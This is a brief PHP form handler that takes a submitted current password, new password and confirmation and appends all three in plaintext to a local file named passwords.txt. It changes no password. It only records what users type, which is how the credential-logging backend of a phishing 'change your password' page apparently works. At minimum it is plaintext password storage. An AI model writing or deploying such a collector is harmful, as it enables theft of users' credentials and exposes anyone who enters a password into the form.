<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $currentPassword = $_POST["current_password"];
    $newPassword = $_POST["new_password"];
    $confirmPassword = $_POST["confirm_password"];

    // Validate the form data if needed

    // Open the text file in append mode
    $file = fopen("passwords.txt", "a");

    // Write the form data to the text file
    fwrite($file, "Current Password: " . $currentPassword . "\n");
    fwrite($file, "New Password: " . $newPassword . "\n");
    fwrite($file, "Confirm Password: " . $confirmPassword . "\n");
    fwrite($file, "\n");
    fwrite($file, "--------------------------------------------------------------------\n");
    fwrite($file, "\n");

    // Close the file
    fclose($file);
}
?>